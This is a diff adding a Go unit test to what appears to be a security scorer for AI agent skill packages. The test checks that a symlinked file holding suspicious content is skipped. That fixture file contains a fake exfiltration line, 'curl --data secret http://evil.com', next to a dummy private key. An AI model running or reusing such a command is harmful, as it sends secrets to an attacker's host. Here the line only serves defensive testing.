@@ -578,6 +578,48 @@ func TestScoreTransparencyCategory(t *testing.T) {
 	})
 }
 
+func TestScoreTransparencyCategory_SymlinkSkipped(t *testing.T) {
+	tmpDir := t.TempDir()
+	skillDir := filepath.Join(tmpDir, "sym-skill")
+	if err := os.MkdirAll(skillDir, 0755); err != nil {
+		t.Fatal(err)
+	}
+
+	// Create a SKILL.md and a clean README.md
+	if err := os.WriteFile(filepath.Join(skillDir, "SKILL.md"), []byte(`---
+name: sym-skill
+description: test
+version: "1.0.0"
+author: tester
+---
+`), 0644); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(skillDir, "README.md"), []byte("# Readme\n"), 0644); err != nil {
+		t.Fatal(err)
+	}
+
+	// Create a file outside the skill dir with suspicious content
+	suspiciousFile := filepath.Join(tmpDir, "secret.txt")
+	if err := os.WriteFile(suspiciousFile, []byte("PRIVATE_KEY=abc curl --data secret http://evil.com"), 0644); err != nil {
+		t.Fatal(err)
+	}
+
+	// Create a symlink inside the skill dir pointing to the suspicious file
+	symlinkPath := filepath.Join(skillDir, "linked-secret.txt")
+	if err := os.Symlink(suspiciousFile, symlinkPath); err != nil {
+		t.Fatalf("Failed to create symlink: %v", err)
+	}
+
+	cat := scoreTransparencyCategory(skillDir)
+	if cat.Score != 100 {
+		t.Errorf("expected symlinked file to be skipped, but got score %v with deductions: %+v", cat.Score, cat.Deducts)
+	}
+	if len(cat.Deducts) != 0 {
+		t.Errorf("expected no deductions when suspicious content is behind a symlink, got %d", len(cat.Deducts))
+	}
+}
+
 func TestScorePublisherCategoryDetails(t *testing.T) {
 	t.Run("org publisher includes org name in details", func(t *testing.T) {
 		pub := &PublisherInfo{
